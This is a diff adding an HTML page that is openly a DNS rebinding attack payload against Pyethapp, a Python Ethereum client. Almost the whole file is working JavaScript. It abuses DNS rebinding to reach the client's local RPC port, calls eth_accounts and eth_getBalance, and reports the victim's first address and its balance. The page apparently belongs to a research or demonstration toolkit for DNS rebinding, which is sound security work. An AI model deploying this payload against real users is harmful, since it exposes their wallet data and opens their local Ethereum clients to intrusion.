@@ -1,0 +1,80 @@
+<!--
+This payload exploits Pyethapp (https://github.com/ethereum/pyethapp), 
+a Python implementation of the Ethereum client.
+The exploit performs two RPC requests:
+- eth_accounts : Get the list of owned eth addresses
+- eth_getBalance : Retrieve the balance of the first eth address
+The default RPC port for Pyethapp is TCP 4000 (127.0.0.1:4000)
+-->
+<!doctype html>
+<html>
+<head>
+    <title>pyethapp DNS Rebinding Attack</title>
+    <script src="payload.js"></script>
+    <script>
+	var timer;
+	var interval = 60000;
+	var address;
+
+	function attack() {
+		/* eth_accounts : Send a POST request to get the list of eth addresses owned by client */
+		fetch('/', {
+			method: 'POST',
+			body: JSON.stringify({"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1})
+		})
+		.then(responseOKOrFail("Could not submit a request to get a list of eth addresses"))
+		.then(function (d) { // we successfully received data (the eth addresses)
+			/* eth_getBalance : Send a second POST request to get the balance of the first account */
+			data = JSON.parse(d); // parse JSON server response
+			console.log("received JSON response: " + d);
+			address = data.result[0]; // get first address from addresses array
+			console.log("address: " + address);
+
+			var jsonDataToSend = {
+				'jsonrpc': '2.0',
+				'method': 'eth_getBalance',
+				'params': [address, "latest"],
+				"id": 1
+			};
+			return fetch(`/`, {
+				method: 'POST',
+				body: JSON.stringify(jsonDataToSend)
+				})
+
+		})
+		.then(responseOKOrFail("Could not submit a request to get the eth balance"))
+		.then(function (d) { // we successfully received the response
+			clearInterval(timer);
+			data = JSON.parse(d); // parse JSON server response
+			balance = data.result;
+			attackSuccess("Your ETH address is '"+address+"' and has a balance of " + balance + " wei.");
+			// console.log("RESULT: address '"+address+"' has a balance of " + balance + " wei.");
+			})
+		.catch(function (error) {
+			if (error instanceof TypeError) { // We cannot establish an HTTP connection
+				console.log("frame " + window.location.hostname + " could not load");
+				window.parent.postMessage({
+					status: "error",
+				}, "*")
+			} else if (error.message == 'hastoken') {
+				console.log('DNS rebinding did not happen yet')
+			} else if (error.message == '404') { // We received a 404
+				console.log("file not found. Frame " + window.location.hostname +
+					" has not updated dns yet, waiting " + interval +
+					" ms")
+			} else { // We did not handle something
+				console.log('Unhandled error: ' + error);
+			}
+		});
+	}
+	</script>
+</head>
+<body onload="begin()">
+    <p>
+        <h3>DNS Rebinding Vulnerability in pyethapp</h3>
+    </p>
+    <p>
+        This page is waiting for a dns update.
+    </p>
+</body>
+</html>
